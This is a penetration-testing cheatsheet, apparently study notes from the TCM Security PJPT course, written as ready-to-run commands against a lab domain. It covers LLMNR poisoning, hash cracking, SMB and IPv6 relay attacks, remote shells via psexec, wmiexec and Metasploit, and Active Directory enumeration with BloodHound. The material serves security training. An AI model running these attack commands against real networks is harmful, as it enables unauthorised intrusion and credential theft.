# PJPT-Notes
Cheatsheet from the PJPT course of TCM security.

# Enumeration
```bash
sudo arp-scan -l
```
```bash
netdiscover -r 192.168.5.0/24
```

```bash
nmap -T4 -p- -A 192.168.5.0/24
nmap -T4 -p- -A 192.168.5.1

nmap -T4 -p- -sS -sC 192.168.5.0/24
```

# Initial attacks for Active Directory
## LLMNR Poisoning
1. Start Responder, to capture NTLMv2 hashes
```bash
sudo responder -I tun0 -dP
```
2. If NTLMv2 hash was captured, copy it, save it to a txt file and crack it with hashcat
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## SMB Relay attack
<p>This attacks works, when SMB signing is disabled on the machines.</p>
1. Enumerate, if SMB signing is disabled
```bash
nmap -p445 192.168.5.0/24 --script=smb2-security-mode
```
2. Make changes in the Responder configuration

```bash
sudo nano /etc/responder/Responder.conf

SMB = Off
HTTP = Off
```

3. Start Responder
```bash
sudo responder -I tun0 -dP
```
4. Setup the relay
```bash
# to dump password hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# to create a interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# to run commands to proof
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

# Gaining Shell Access
## Psexec
<p>Create a shell with psexec</p>

```bash
# for domain users
psexec.py test.local/fcastle:'Password1'@192.168.5.1

# for local users
psexec.py fcastle:'Password1'@192.168.5.1

# with local user and password hash
psexec.py Administrator@192.168.5.1 --hashes [LM-hash]:[NTLM-hash]
```

## Wmiexec
<p>Create a shell with wmiexec</p>

```bash
# with local user and password hash
wmiexec.py Administrator@192.168.5.1 --hashes [LM-hash]:[NTLM-hash]
```

## Smbexec
<p>Create a shell with smbexec</p>

```bash
# with local user and password hash
smbexec.py test.local/fcastle:'Password1'@192.168.5.1
```

## Metasploit
<p>Create a shell with metasploit</p>

```bash
use exploit/windows/smb/psexec
set SMBDomain test.local
set SMBUser fcastle
set SMBPass Password1
```

# IPv6 attacks
<p>If IPv6 is activated in the network, but no DNS server in use, we can imitate one.</p>

1. Open mitm6 for target domain
```bash
sudo mitm6 -d test.local
```

2. Start Ntlmrelayx.py
```bash
Ntlmrelayx.py -6 -t ldaps://192.168.5.1 -wh fakewpad.test.local -l lootme
```

3. You results will save into: '**/home/kali/lootme/domain_computers.html**'

# Post Compromise Enumeration Active Directory
## Domain Enumeration with ldapdomaindump
<p>Domain Enumeration with ldapdomaindump</p>

1. Run ldapdomaindump against domain controller - this will create files with information in about the domain
```bash
sudo ldapdomaindump ldaps://192.168.5.1 -u 'test.local\fcastle\' -p Password1
```

2. list all files and open the html files to investigate the domain information
```bash
# list all files
ls -l

# open up all html domain files
firefox domain_*.html
```

## Domain Enumeration with Bloodhound
<p>Domain Enumeration with Bloodhound</p>

1. Run bloodhound with credentials, to fetch information
```bash
sudo bloodhound-python -d [DOMAIN] -u [USERNAME] -p [USER-PW] -ns [DC-IP]

# example
sudo bloodhound-python -d test.local -u fcastle -p Password1 -ns 192.168.5.1 -c all
```

2. Start up neo4j database and bloodhound to import the files
```bash
# if you started the database the first time, set a new password - REMEMBER THE PASSWORD!
sudo neo4j console

# start bloodhound
sudo bloodhound
```

3. If bloodhound started, just drag and drop the json files into bloodhound and start investigation ;)

## Domain Enumeration with Plumhound
<p>Domain Enumeration with Plumhound</p>

1. Start up neo4j database and bloodhound
```bash
# if you started the database the first time, set a new password - REMEMBER THE PASSWORD!
sudo neo4j console

# start bloodhound
sudo bloodhound
```

2. Start Plumhound against the domain controller - BLOODHOUND MUST ALREADY RUNNING!
```bash
sudo python3 PlumHound.py --easy -p [USER-PW]

sudo python3 PlumHound.py -x tasks/default.tasks -p [USER-PW]
```

3. Finally open up the browser and investigate the results
